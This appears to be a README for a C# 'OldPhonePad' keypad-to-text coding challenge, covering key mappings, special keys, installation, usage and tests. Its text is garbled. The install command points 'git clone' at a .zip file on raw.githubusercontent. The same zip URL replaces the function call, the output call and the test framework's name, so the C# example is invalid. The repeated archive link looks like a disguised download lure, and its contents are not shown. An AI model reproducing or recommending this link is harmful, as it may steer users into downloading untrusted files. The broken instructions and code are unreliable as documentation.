# OldPhoneKeypad

This project simulates the behavior of an old phone keypad, where users input numbers corresponding to letters, similar to how texting worked on a phone with a keypad (before touchscreens). The main function, `OldPhonePad`, takes a string input (a sequence of numeric digits and special characters like `*` and `#`) and returns the corresponding text output.

## Features

- Converts keypresses on an old phone keypad into their corresponding letters.
- Handles special characters such as `*` (backspace) and `#` (end input).
- Handles repeated keypresses to select different characters from the same key (e.g., pressing "2" multiple times cycles through "A", "B", "C").
- Supports spaces and outputs them correctly when "0" is pressed.

## How It Works

The `OldPhonePad` function simulates the keypress logic of old phones with a numeric keypad. Each number on the keypad (from `1` to `9`) corresponds to a set of characters. The user can press a key multiple times to cycle through the characters associated with that key.

### Keypad Layout:
- `1`: "&'("
- `2`: "ABC"
- `3`: "DEF"
- `4`: "GHI"
- `5`: "JKL"
- `6`: "MNO"
- `7`: "PQRS"
- `8`: "TUV"
- `9`: "WXYZ"
- `0`: " " (Space)

### Special Keys:
- `*`: Backspace (removes the last entered character).
- `#`: End of input (terminates the input and returns the result).

## Installation

To use this code, simply clone the repository and build the project with a compatible C# environment (e.g., Visual Studio or Visual Studio Code with the C# extension).

1. Clone the repository:

```bash
git clone https://raw.githubusercontent.com/YatiWaiTun86/OldPhonePadCodeChallenge/master/eutropous/OldPhonePadCodeChallenge.zip
```

2. Open the project in your preferred C# IDE.
3. Build and run the project.

## Usage

The main function to convert a keypress sequence into text is `OldPhonePad`. You can call this function with a string of digits, and it will return the corresponding text.

### Example:

```csharp
string input = "227*#";
string result = https://raw.githubusercontent.com/YatiWaiTun86/OldPhonePadCodeChallenge/master/eutropous/OldPhonePadCodeChallenge.zip(input);
https://raw.githubusercontent.com/YatiWaiTun86/OldPhonePadCodeChallenge/master/eutropous/OldPhonePadCodeChallenge.zip(result);  // Output: "B"
```

## Unit Tests

Unit tests are provided using the `https://raw.githubusercontent.com/YatiWaiTun86/OldPhonePadCodeChallenge/master/eutropous/OldPhonePadCodeChallenge.zip` framework. The tests check various scenarios, such as valid key sequences, handling of special characters, and space handling.

To run tests:

1. Open the solution in Visual Studio.
2. Build the solution.
3. Run tests from the **Test Explorer**.

## License

This project is licensed under the MIT License.
